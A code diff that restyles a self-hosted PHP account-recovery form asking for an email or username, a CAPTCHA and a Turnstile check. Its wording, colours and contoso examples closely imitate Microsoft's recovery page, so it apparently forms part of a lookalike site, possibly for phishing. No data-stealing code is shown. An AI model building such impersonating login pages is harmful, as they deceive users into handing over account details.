@@ -61,46 +61,82 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       background-color: #f4f4f4;
     }
     .container {
-      text-align: left;
       background-color: #fff;
       padding: 20px;
-      width: 320px;
+      width: 400px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       border-radius: 8px;
+    }
+    h1 {
+      font-size: 1.5em;
+      margin-bottom: 8px;
+    }
+    .description {
+      font-size: 0.9em;
+      color: #555;
+      margin-bottom: 20px;
+      font-style: italic;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 15px;
+      margin-bottom: 5px;
+    }
+    .helper-text {
+      font-size: 0.85em;
+      color: #555;
+      margin-top: 5px;
     }
     .captcha-image {
       display: flex;
       align-items: center;
       gap: 10px;
+      margin-top: 10px;
     }
     .captcha-input, #email {
-      font-size: 16px; /* Prevents zoom on mobile */
+      font-size: 16px;
       width: 100%;
       padding: 8px;
-      margin-top: 10px;
       border: 1px solid #ccc;
       border-radius: 4px;
       box-sizing: border-box;
+      margin-top: 5px;
     }
     .error-message {
       color: red;
       font-size: 0.9em;
       margin-bottom: 10px;
     }
-    button {
-      width: 100%;
+    .button-container {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    .next-button, .cancel-button {
+      flex: 1;
       padding: 10px;
-      background-color: #0078d4;
-      color: #fff;
       border: none;
       border-radius: 4px;
       cursor: pointer;
       font-size: 1em;
     }
+    .next-button {
+      background-color: #0078d4;
+      color: #fff;
+    }
+    .cancel-button {
+      background-color: transparent;
+      color: #0078d4;
+      text-decoration: underline;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
   <div class="container">
+    <h1>Who are you?</h1>
+    <p class="description">To recover your account, begin by entering your email or username and the characters in the picture or audio below.</p>
     <?php
     session_start();
     if (isset($_SESSION['error_message'])) {
@@ -110,12 +146,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     ?>
     <form id="captcha-form" action="validate_captcha.php" method="POST">
       <!-- Email input -->
-      <label for="email">Email or Username:</label>
+      <label for="email">Email or Username: <span style="color: red;">*</span></label>
       <input type="email" id="email" name="email" required>
       <div class="helper-text">Example: user@contoso.onmicrosoft.com or user@contoso.com</div>
 
       <!-- Text-based CAPTCHA -->
-      <label for="text-captcha">Enter the characters in the image:</label>
+      <label for="text-captcha">Enter the characters in the picture or the words in the audio: <span style="color: red;">*</span></label>
       <div class="captcha-image">
         <img src="generate_captcha.php" alt="CAPTCHA Image" id="captcha-image">
         <button type="button" onclick="refreshCaptcha()">↻</button>
@@ -128,8 +164,11 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
            data-callback="onTurnstileVerified">
       </div>
 
-      <!-- Submit button, enabled only after CAPTCHA verification -->
-      <button id="next-button" type="submit" disabled>Next</button>
+      <!-- Submit and Cancel buttons -->
+      <div class="button-container">
+        <button id="next-button" class="next-button" type="submit" disabled>Next</button>
+        <button type="button" class="cancel-button" onclick="window.location.href='#'">Cancel</button>
+      </div>
     </form>
   </div>
 
